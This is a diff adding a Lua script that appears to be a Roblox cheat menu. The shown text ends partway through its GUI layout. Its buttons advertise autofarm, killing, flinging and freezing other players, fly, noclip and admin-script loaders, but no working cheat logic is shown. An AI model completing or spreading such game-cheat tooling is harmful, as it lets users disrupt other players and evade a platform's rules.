@@ -1,0 +1,2205 @@
+--[[
+https://discord.gg/C9JhKkY4cB
+]]
+print("Script made by mkl73lol")
+print("mikaa was here !!!")
+print("if you want to contact me, my discord is 1003z")
+
+
+getgenv().aa = false
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local MiniFrame1 = Instance.new("Frame")
+local Autofarm = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local antiafk = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local antifling = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local gm = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local Autofarmop = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local afText = Instance.new("TextLabel")
+local UICorner_6 = Instance.new("UICorner")
+local afopText = Instance.new("TextLabel")
+local UICorner_7 = Instance.new("UICorner")
+local aftextt = Instance.new("TextLabel")
+local UICorner_8 = Instance.new("UICorner")
+local aftextt_2 = Instance.new("TextLabel")
+local UICorner_9 = Instance.new("UICorner")
+local aftextt_3 = Instance.new("TextLabel")
+local UICorner_10 = Instance.new("UICorner")
+local Killall = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local TabButton2 = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local TabButton1 = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local UICorner_14 = Instance.new("UICorner")
+local MiniFrame2 = Instance.new("Frame")
+local UICorner_15 = Instance.new("UICorner")
+local wsb = Instance.new("TextButton")
+local wsbox = Instance.new("TextBox")
+local jpbox = Instance.new("TextBox")
+local jpb = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local flytext = Instance.new("TextLabel")
+local UICorner_16 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+local humanroll = Instance.new("TextButton")
+local UICorner_17 = Instance.new("UICorner")
+local plrstats = Instance.new("TextButton")
+local UICorner_18 = Instance.new("UICorner")
+local freeze = Instance.new("TextButton")
+local UICorner_19 = Instance.new("UICorner")
+local fly = Instance.new("TextButton")
+local UICorner_20 = Instance.new("UICorner")
+local wstext = Instance.new("TextLabel")
+local TabButton3 = Instance.new("TextButton")
+local UICorner_21 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local UICorner_22 = Instance.new("UICorner")
+local TextLabel_5 = Instance.new("TextLabel")
+local MiniFrame3 = Instance.new("Frame")
+local iy = Instance.new("TextButton")
+local UICorner_23 = Instance.new("UICorner")
+local ivadmin2 = Instance.new("TextButton")
+local UICorner_24 = Instance.new("UICorner")
+local ivadmin3 = Instance.new("TextButton")
+local UICorner_25 = Instance.new("UICorner")
+local spy = Instance.new("TextButton")
+local UICorner_26 = Instance.new("UICorner")
+local fps = Instance.new("TextButton")
+local UICorner_27 = Instance.new("UICorner")
+local fpstext = Instance.new("TextLabel")
+local UICorner_28 = Instance.new("UICorner")
+local noclip = Instance.new("TextButton")
+local UICorner_29 = Instance.new("UICorner")
+local nocliptext = Instance.new("TextLabel")
+local UICorner_30 = Instance.new("UICorner")
+local TabButton4 = Instance.new("TextButton")
+local UICorner_31 = Instance.new("UICorner")
+local MiniFrame4 = Instance.new("Frame")
+local killplr = Instance.new("TextButton")
+local UICorner_32 = Instance.new("UICorner")
+local flingplr = Instance.new("TextButton")
+local UICorner_33 = Instance.new("UICorner")
+local killtx = Instance.new("TextBox")
+local flingtx = Instance.new("TextBox")
+local exit = Instance.new("TextButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_7 = Instance.new("TextLabel")
+local TextLabel_8 = Instance.new("TextLabel")
+local TabButton5 = Instance.new("TextButton")
+local UICorner_34 = Instance.new("UICorner")
+local MiniFrame5 = Instance.new("Frame")
+local infom = Instance.new("TextLabel")
+local infom_2 = Instance.new("TextLabel")
+local infom_3 = Instance.new("TextLabel")
+local ProfilePicture = Instance.new("ImageLabel")
+local ProfilePicture2 = Instance.new("ImageLabel")
+local _0qqinfotext = Instance.new("TextLabel")
+local _1003zinfottetx = Instance.new("TextLabel")
+local ProfilePicture_2 = Instance.new("ImageLabel")
+local Open = Instance.new("TextButton")
+local UICorner_35 = Instance.new("UICorner")
+local autofireEnabled = false
+local newScriptConnection
+local RunService = game:GetService("RunService")
+local plr = game.Players.LocalPlayer
+ScreenGui.ResetOnSpawn = false
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+MainFrame.BackgroundTransparency = 0.600
+MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 10
+MainFrame.Position = UDim2.new(0.0857499763, 0, 0.188477963, 0)
+MainFrame.Size = UDim2.new(0, 541, 0, 275)
+
+TextLabel.Parent = MainFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(-0.000464867393, 0, -0.00155650743, 0)
+TextLabel.Size = UDim2.new(0, 191, 0, 48)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+MiniFrame1.Name = "MiniFrame1"
+MiniFrame1.Parent = MainFrame
+MiniFrame1.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+MiniFrame1.BackgroundTransparency = 0.700
+MiniFrame1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniFrame1.BorderSizePixel = 0
+MiniFrame1.Position = UDim2.new(0.0204841718, 0, 0.203636363, 0)
+MiniFrame1.Size = UDim2.new(0, 417, 0, 210)
+MiniFrame1.Visible = false
+
+Autofarm.Name = "Autofarm"
+Autofarm.Parent = MiniFrame1
+Autofarm.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+Autofarm.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Autofarm.BorderSizePixel = 0
+Autofarm.Position = UDim2.new(0.477583915, 0, 0.0809523836, 0)
+Autofarm.Size = UDim2.new(0, 59, 0, 40)
+Autofarm.Font = Enum.Font.SourceSans
+Autofarm.Text = "off"
+Autofarm.TextColor3 = Color3.fromRGB(0, 0, 0)
+Autofarm.TextSize = 27.000
+
+UICorner.Parent = Autofarm
+
+antiafk.Name = "antiafk"
+antiafk.Parent = MiniFrame1
+antiafk.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+antiafk.BorderColor3 = Color3.fromRGB(0, 0, 0)
+antiafk.BorderSizePixel = 0
+antiafk.Position = UDim2.new(0.0359712243, 0, 0.347619057, 0)
+antiafk.Size = UDim2.new(0, 58, 0, 40)
+antiafk.Font = Enum.Font.SourceSans
+antiafk.Text = "off"
+antiafk.TextColor3 = Color3.fromRGB(0, 0, 0)
+antiafk.TextSize = 27.000
+
+UICorner_2.Parent = antiafk
+
+antifling.Name = "antifling"
+antifling.Parent = MiniFrame1
+antifling.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+antifling.BorderColor3 = Color3.fromRGB(0, 0, 0)
+antifling.BorderSizePixel = 0
+antifling.Position = UDim2.new(0.0359712243, 0, 0.600000024, 0)
+antifling.Size = UDim2.new(0, 58, 0, 40)
+antifling.Font = Enum.Font.SourceSans
+antifling.Text = "off"
+antifling.TextColor3 = Color3.fromRGB(0, 0, 0)
+antifling.TextSize = 27.000
+
+UICorner_3.Parent = antifling
+
+gm.Name = "gm"
+gm.Parent = MiniFrame1
+gm.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+gm.BorderColor3 = Color3.fromRGB(0, 0, 0)
+gm.BorderSizePixel = 0
+gm.Position = UDim2.new(0.4772183, 0, 0.600000024, 0)
+gm.Size = UDim2.new(0, 58, 0, 40)
+gm.Font = Enum.Font.SourceSans
+gm.Text = "off"
+gm.TextColor3 = Color3.fromRGB(0, 0, 0)
+gm.TextSize = 27.000
+
+UICorner_4.Parent = gm
+
+Autofarmop.Name = "Autofarmop"
+Autofarmop.Parent = MiniFrame1
+Autofarmop.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+Autofarmop.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Autofarmop.BorderSizePixel = 0
+Autofarmop.Position = UDim2.new(0.479616374, 0, 0.347619057, 0)
+Autofarmop.Size = UDim2.new(0, 197, 0, 40)
+Autofarmop.Font = Enum.Font.SourceSans
+Autofarmop.Text = "Autofarm [high ping]"
+Autofarmop.TextColor3 = Color3.fromRGB(0, 0, 0)
+Autofarmop.TextSize = 27.000
+
+UICorner_5.Parent = Autofarmop
+
+afText.Name = "afText"
+afText.Parent = MiniFrame1
+afText.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+afText.BorderColor3 = Color3.fromRGB(0, 0, 0)
+afText.BorderSizePixel = 0
+afText.Position = UDim2.new(0.618705094, 0, 0.0809523836, 0)
+afText.Size = UDim2.new(0, 139, 0, 40)
+afText.Font = Enum.Font.SourceSans
+afText.Text = "Autofarm [35]"
+afText.TextColor3 = Color3.fromRGB(0, 0, 0)
+afText.TextSize = 28.000
+
+UICorner_6.Parent = afText
+
+afopText.Name = "afopText"
+afopText.Parent = MiniFrame1
+afopText.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+afopText.BorderColor3 = Color3.fromRGB(0, 0, 0)
+afopText.BorderSizePixel = 0
+afopText.Position = UDim2.new(0.61630702, 0, 0.600000024, 0)
+afopText.Size = UDim2.new(0, 140, 0, 40)
+afopText.Font = Enum.Font.SourceSans
+afopText.Text = "not working"
+afopText.TextColor3 = Color3.fromRGB(0, 0, 0)
+afopText.TextSize = 30.000
+
+UICorner_7.Parent = afopText
+
+aftextt.Name = "aftextt"
+aftextt.Parent = MiniFrame1
+aftextt.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+aftextt.BorderColor3 = Color3.fromRGB(0, 0, 0)
+aftextt.BorderSizePixel = 0
+aftextt.Position = UDim2.new(0.172661975, 0, 0.600000024, 0)
+aftextt.Size = UDim2.new(0, 106, 0, 40)
+aftextt.Font = Enum.Font.SourceSans
+aftextt.Text = "anti fling"
+aftextt.TextColor3 = Color3.fromRGB(0, 0, 0)
+aftextt.TextSize = 30.000
+
+UICorner_8.Parent = aftextt
+
+aftextt_2.Name = "aftextt"
+aftextt_2.Parent = MiniFrame1
+aftextt_2.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+aftextt_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+aftextt_2.BorderSizePixel = 0
+aftextt_2.Position = UDim2.new(0.175060019, 0, 0.347619057, 0)
+aftextt_2.Size = UDim2.new(0, 106, 0, 40)
+aftextt_2.Font = Enum.Font.SourceSans
+aftextt_2.Text = "anti afk"
+aftextt_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+aftextt_2.TextSize = 30.000
+
+UICorner_9.Parent = aftextt_2
+
+aftextt_3.Name = "aftextt"
+aftextt_3.Parent = MiniFrame1
+aftextt_3.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+aftextt_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+aftextt_3.BorderSizePixel = 0
+aftextt_3.Position = UDim2.new(0.175060019, 0, 0.347619057, 0)
+aftextt_3.Size = UDim2.new(0, 106, 0, 40)
+aftextt_3.Font = Enum.Font.SourceSans
+aftextt_3.Text = "anti afk"
+aftextt_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+aftextt_3.TextSize = 30.000
+
+UICorner_10.Parent = aftextt_3
+
+Killall.Name = "Killall"
+Killall.Parent = MiniFrame1
+Killall.BackgroundColor3 = Color3.fromRGB(161, 213, 205)
+Killall.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Killall.BorderSizePixel = 0
+Killall.Position = UDim2.new(0.0359712243, 0, 0.0809523836, 0)
+Killall.Size = UDim2.new(0, 164, 0, 40)
+Killall.Font = Enum.Font.SourceSans
+Killall.Text = "not working"
+Killall.TextColor3 = Color3.fromRGB(0, 0, 0)
+Killall.TextSize = 27.000
+
+UICorner_11.Parent = Killall
+
+TabButton2.Name = "TabButton2"
+TabButton2.Parent = MainFrame
+TabButton2.BackgroundColor3 = Color3.fromRGB(177, 108, 177)
+TabButton2.BackgroundTransparency = 0.690
+TabButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton2.BorderSizePixel = 0
+TabButton2.Position = UDim2.new(0.797020495, 0, 0.370909095, 0)
+TabButton2.Size = UDim2.new(0, 109, 0, 40)
+TabButton2.Font = Enum.Font.SourceSans
+TabButton2.Text = "2"
+TabButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton2.TextSize = 14.000
+
+UICorner_12.Parent = TabButton2
+
+TabButton1.Name = "TabButton1"
+TabButton1.Parent = MainFrame
+TabButton1.BackgroundColor3 = Color3.fromRGB(94, 158, 156)
+TabButton1.BackgroundTransparency = 0.690
+TabButton1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton1.BorderSizePixel = 0
+TabButton1.Position = UDim2.new(0.797020495, 0, 0.203636363, 0)
+TabButton1.Size = UDim2.new(0, 109, 0, 40)
+TabButton1.Font = Enum.Font.SourceSans
+TabButton1.Text = "1"
+TabButton1.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton1.TextSize = 14.000
+
+UICorner_13.Parent = TabButton1
+
+UICorner_14.Parent = MainFrame
+
+MiniFrame2.Name = "MiniFrame2"
+MiniFrame2.Parent = MainFrame
+MiniFrame2.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+MiniFrame2.BackgroundTransparency = 0.700
+MiniFrame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniFrame2.BorderSizePixel = 0
+MiniFrame2.Position = UDim2.new(0.0204841718, 0, 0.203636363, 0)
+MiniFrame2.Size = UDim2.new(0, 417, 0, 210)
+MiniFrame2.Visible = false
+
+UICorner_15.Parent = MiniFrame2
+
+wsb.Name = "wsb"
+wsb.Parent = MiniFrame2
+wsb.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+wsb.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wsb.BorderSizePixel = 0
+wsb.Position = UDim2.new(0.0215827338, 0, 0.728571415, 0)
+wsb.Size = UDim2.new(0, 164, 0, 40)
+wsb.Font = Enum.Font.SourceSans
+wsb.Text = "Press to change"
+wsb.TextColor3 = Color3.fromRGB(0, 0, 0)
+wsb.TextSize = 25.000
+
+wsbox.Name = "wsbox"
+wsbox.Parent = MiniFrame2
+wsbox.BackgroundColor3 = Color3.fromRGB(194, 131, 138)
+wsbox.BackgroundTransparency = 0.300
+wsbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wsbox.BorderSizePixel = 0
+wsbox.Position = UDim2.new(0.0215827338, 0, 0.538095236, 0)
+wsbox.Size = UDim2.new(0, 164, 0, 40)
+wsbox.Font = Enum.Font.SourceSans
+wsbox.Text = "Enter speed"
+wsbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+wsbox.TextSize = 14.000
+
+jpbox.Name = "jpbox"
+jpbox.Parent = MiniFrame2
+jpbox.BackgroundColor3 = Color3.fromRGB(194, 131, 138)
+jpbox.BackgroundTransparency = 0.300
+jpbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+jpbox.BorderSizePixel = 0
+jpbox.Position = UDim2.new(0.474820137, 0, 0.538095236, 0)
+jpbox.Size = UDim2.new(0, 164, 0, 40)
+jpbox.Font = Enum.Font.SourceSans
+jpbox.Text = "Enter jump power"
+jpbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+jpbox.TextSize = 14.000
+
+jpb.Name = "jpb"
+jpb.Parent = MiniFrame2
+jpb.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+jpb.BorderColor3 = Color3.fromRGB(0, 0, 0)
+jpb.BorderSizePixel = 0
+jpb.Position = UDim2.new(0.474820137, 0, 0.728571415, 0)
+jpb.Size = UDim2.new(0, 164, 0, 40)
+jpb.Font = Enum.Font.SourceSans
+jpb.Text = "Press to change"
+jpb.TextColor3 = Color3.fromRGB(0, 0, 0)
+jpb.TextSize = 25.000
+
+TextLabel_2.Parent = MiniFrame2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.474820137, 0, 0.423809528, 0)
+TextLabel_2.Size = UDim2.new(0, 164, 0, 14)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "↓ Jump Power ↓"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 24.000
+
+flytext.Name = "flytext"
+flytext.Parent = MiniFrame2
+flytext.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+flytext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+flytext.BorderSizePixel = 0
+flytext.Position = UDim2.new(0.896882594, 0, 0.571428597, 0)
+flytext.Size = UDim2.new(0, 33, 0, 33)
+flytext.Font = Enum.Font.SourceSans
+flytext.Text = "fly"
+flytext.TextColor3 = Color3.fromRGB(0, 0, 0)
+flytext.TextSize = 24.000
+
+UICorner_16.Parent = flytext
+
+TextLabel_3.Parent = MiniFrame2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(7.31836423e-08, 0, 0, 0)
+TextLabel_3.Size = UDim2.new(0, 417, 0, 16)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Player"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextSize = 33.000
+
+humanroll.Name = "humanroll"
+humanroll.Parent = MiniFrame2
+humanroll.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+humanroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
+humanroll.BorderSizePixel = 0
+humanroll.Position = UDim2.new(0.0359712243, 0, 0.190476194, 0)
+humanroll.Size = UDim2.new(0, 114, 0, 40)
+humanroll.Font = Enum.Font.SourceSans
+humanroll.Text = "human roll"
+humanroll.TextColor3 = Color3.fromRGB(0, 0, 0)
+humanroll.TextSize = 27.000
+
+UICorner_17.Parent = humanroll
+
+plrstats.Name = "plrstats"
+plrstats.Parent = MiniFrame2
+plrstats.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+plrstats.BorderColor3 = Color3.fromRGB(0, 0, 0)
+plrstats.BorderSizePixel = 0
+plrstats.Position = UDim2.new(0.362110317, 0, 0.190476194, 0)
+plrstats.Size = UDim2.new(0, 114, 0, 40)
+plrstats.Font = Enum.Font.SourceSans
+plrstats.Text = "not wotking"
+plrstats.TextColor3 = Color3.fromRGB(0, 0, 0)
+plrstats.TextSize = 27.000
+
+UICorner_18.Parent = plrstats
+
+freeze.Name = "freeze"
+freeze.Parent = MiniFrame2
+freeze.BackgroundColor3 = Color3.fromRGB(213, 144, 151)
+freeze.BorderColor3 = Color3.fromRGB(0, 0, 0)
+freeze.BorderSizePixel = 0
+freeze.Position = UDim2.new(0.673860908, 0, 0.190476194, 0)
+freeze.Size = UDim2.new(0, 114, 0, 40)
+freeze.Font = Enum.Font.SourceSans
+freeze.Text = "Freeze player"
+freeze.TextColor3 = Color3.fromRGB(0, 0, 0)
+freeze.TextSize = 25.000
+
+UICorner_19.Parent = freeze
+
+fly.Name = "fly"
+fly.Parent = MiniFrame2
+fly.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+fly.BorderColor3 = Color3.fromRGB(0, 0, 0)
+fly.BorderSizePixel = 0
+fly.Position = UDim2.new(0.896882594, 0, 0.728571415, 0)
+fly.Size = UDim2.new(0, 33, 0, 40)
+fly.Font = Enum.Font.SourceSans
+fly.Text = "off"
+fly.TextColor3 = Color3.fromRGB(0, 0, 0)
+fly.TextSize = 25.000
+
+UICorner_20.Parent = fly
+
+wstext.Name = "wstext"
+wstext.Parent = MiniFrame2
+wstext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+wstext.BackgroundTransparency = 1.000
+wstext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wstext.BorderSizePixel = 0
+wstext.Position = UDim2.new(0.0215827338, 0, 0.423809528, 0)
+wstext.Size = UDim2.new(0, 164, 0, 14)
+wstext.Font = Enum.Font.SourceSans
+wstext.Text = "↓ Speed ↓"
+wstext.TextColor3 = Color3.fromRGB(0, 0, 0)
+wstext.TextSize = 24.000
+
+TabButton3.Name = "TabButton3"
+TabButton3.Parent = MainFrame
+TabButton3.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+TabButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton3.BorderSizePixel = 0
+TabButton3.Position = UDim2.new(0.797020495, 0, 0.530909061, 0)
+TabButton3.Size = UDim2.new(0, 109, 0, 40)
+TabButton3.Font = Enum.Font.SourceSans
+TabButton3.Text = "3"
+TabButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton3.TextSize = 14.000
+
+UICorner_21.Parent = TabButton3
+
+TextLabel_4.Parent = MainFrame
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+TextLabel_4.BackgroundTransparency = 0.600
+TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(0.447211355, 0, 0, 0)
+TextLabel_4.Size = UDim2.new(0, 296, 0, 50)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = ""
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextSize = 14.000
+
+UICorner_22.Parent = TextLabel_4
+
+TextLabel_5.Parent = MainFrame
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+TextLabel_5.BackgroundTransparency = 0.600
+TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.BorderSizePixel = 0
+TextLabel_5.Position = UDim2.new(0.983240247, 0, 0.1475344, 0)
+TextLabel_5.Size = UDim2.new(0, 9, 0, 9)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = ""
+TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.TextSize = 14.000
+
+MiniFrame3.Name = "MiniFrame3"
+MiniFrame3.Parent = MainFrame
+MiniFrame3.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
+MiniFrame3.BackgroundTransparency = 0.700
+MiniFrame3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniFrame3.BorderSizePixel = 0
+MiniFrame3.Position = UDim2.new(0.0204842277, 0, 0.203636363, 0)
+MiniFrame3.Size = UDim2.new(0, 417, 0, 209)
+MiniFrame3.Visible = false
+
+iy.Name = "iy"
+iy.Parent = MiniFrame3
+iy.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+iy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+iy.BorderSizePixel = 0
+iy.Position = UDim2.new(0.0359712243, 0, 0.12273863, 0)
+iy.Size = UDim2.new(0, 125, 0, 38)
+iy.Font = Enum.Font.SourceSans
+iy.Text = "Inf yield"
+iy.TextColor3 = Color3.fromRGB(0, 0, 0)
+iy.TextSize = 26.000
+
+UICorner_23.Parent = iy
+
+ivadmin2.Name = "ivadmin2"
+ivadmin2.Parent = MiniFrame3
+ivadmin2.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+ivadmin2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ivadmin2.BorderSizePixel = 0
+ivadmin2.Position = UDim2.new(0.0359712243, 0, 0.371542454, 0)
+ivadmin2.Size = UDim2.new(0, 125, 0, 38)
+ivadmin2.Font = Enum.Font.SourceSans
+ivadmin2.Text = "Iv admin2"
+ivadmin2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ivadmin2.TextSize = 26.000
+
+UICorner_24.Parent = ivadmin2
+
+ivadmin3.Name = "ivadmin3"
+ivadmin3.Parent = MiniFrame3
+ivadmin3.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+ivadmin3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ivadmin3.BorderSizePixel = 0
+ivadmin3.Position = UDim2.new(0.0359712243, 0, 0.620346308, 0)
+ivadmin3.Size = UDim2.new(0, 125, 0, 38)
+ivadmin3.Font = Enum.Font.SourceSans
+ivadmin3.Text = "Iv admin3"
+ivadmin3.TextColor3 = Color3.fromRGB(0, 0, 0)
+ivadmin3.TextSize = 26.000
+
+UICorner_25.Parent = ivadmin3
+
+spy.Name = "spy"
+spy.Parent = MiniFrame3
+spy.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+spy.BorderColor3 = Color3.fromRGB(0, 0, 0)
+spy.BorderSizePixel = 0
+spy.Position = UDim2.new(0.429256588, 0, 0.12273863, 0)
+spy.Size = UDim2.new(0, 125, 0, 38)
+spy.Font = Enum.Font.SourceSans
+spy.Text = "spy"
+spy.TextColor3 = Color3.fromRGB(0, 0, 0)
+spy.TextSize = 26.000
+
+UICorner_26.Parent = spy
+
+fps.Name = "fps"
+fps.Parent = MiniFrame3
+fps.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+fps.BorderColor3 = Color3.fromRGB(0, 0, 0)
+fps.BorderSizePixel = 0
+fps.Position = UDim2.new(0.429622233, 0, 0.371542454, 0)
+fps.Size = UDim2.new(0, 51, 0, 38)
+fps.Font = Enum.Font.SourceSans
+fps.Text = "off"
+fps.TextColor3 = Color3.fromRGB(0, 0, 0)
+fps.TextSize = 26.000
+
+UICorner_27.Parent = fps
+
+fpstext.Name = "fpstext"
+fpstext.Parent = MiniFrame3
+fpstext.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+fpstext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+fpstext.BorderSizePixel = 0
+fpstext.Position = UDim2.new(0.551558733, 0, 0.368421495, 0)
+fpstext.Size = UDim2.new(0, 126, 0, 38)
+fpstext.Font = Enum.Font.SourceSans
+fpstext.Text = "Fps booster"
+fpstext.TextColor3 = Color3.fromRGB(0, 0, 0)
+fpstext.TextSize = 26.000
+
+UICorner_28.Parent = fpstext
+
+noclip.Name = "noclip"
+noclip.Parent = MiniFrame3
+noclip.BackgroundColor3 = Color3.fromRGB(207, 213, 213)
+noclip.BorderColor3 = Color3.fromRGB(0, 0, 0)
+noclip.BorderSizePixel = 0
+noclip.Position = UDim2.new(0.427224129, 0, 0.620346308, 0)
+noclip.Size = UDim2.new(0, 51, 0, 38)
+noclip.Font = Enum.Font.SourceSans
+noclip.Text = "off"
+noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
+noclip.TextSize = 26.000
+
+UICorner_29.Parent = noclip
+
+nocliptext.Name = "nocliptext"
+nocliptext.Parent = MiniFrame3
+nocliptext.BackgroundColor3 = Color3.fromRGB(200, 194, 147)
+nocliptext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+nocliptext.BorderSizePixel = 0
+nocliptext.Position = UDim2.new(0.551558733, 0, 0.617225289, 0)
+nocliptext.Size = UDim2.new(0, 126, 0, 38)
+nocliptext.Font = Enum.Font.SourceSans
+nocliptext.Text = "no clip"
+nocliptext.TextColor3 = Color3.fromRGB(0, 0, 0)
+nocliptext.TextSize = 26.000
+
+UICorner_30.Parent = nocliptext
+
+TabButton4.Name = "TabButton4"
+TabButton4.Parent = MainFrame
+TabButton4.BackgroundColor3 = Color3.fromRGB(140, 200, 127)
+TabButton4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton4.BorderSizePixel = 0
+TabButton4.Position = UDim2.new(0.797020555, 0, 0.698181689, 0)
+TabButton4.Size = UDim2.new(0, 109, 0, 40)
+TabButton4.Font = Enum.Font.SourceSans
+TabButton4.Text = "4"
+TabButton4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton4.TextSize = 14.000
+
+UICorner_31.Parent = TabButton4
+
+MiniFrame4.Name = "MiniFrame4"
+MiniFrame4.Parent = MainFrame
+MiniFrame4.BackgroundColor3 = Color3.fromRGB(140, 200, 127)
+MiniFrame4.BackgroundTransparency = 0.500
+MiniFrame4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MiniFrame4.BorderSizePixel = 0
+MiniFrame4.Position = UDim2.new(0.0204842277, 0, 0.203636363, 0)
+MiniFrame4.Size = UDim2.new(0, 417, 0, 209)
+MiniFrame4.Visible = false
+
+killplr.Name = "killplr"
+killplr.Parent = MiniFrame4
+killplr.BackgroundColor3 = Color3.fromRGB(106, 190, 106)
+killplr.BorderColor3 = Color3.fromRGB(0, 0, 0)
+killplr.BorderSizePixel = 0
+killplr.Position = UDim2.new(0.0359712243, 0, 0.363248974, 0)
+killplr.Size = UDim2.new(0, 164, 0, 40)
+killplr.Font = Enum.Font.SourceSans
+killplr.Text = "Execute command"
+killplr.TextColor3 = Color3.fromRGB(0, 0, 0)
+killplr.TextSize = 21.000
+
+UICorner_32.Parent = killplr
+
+flingplr.Name = "flingplr"
+flingplr.Parent = MiniFrame4
+flingplr.BackgroundColor3 = Color3.fromRGB(106, 190, 106)
+flingplr.BorderColor3 = Color3.fromRGB(0, 0, 0)
+flingplr.BorderSizePixel = 0
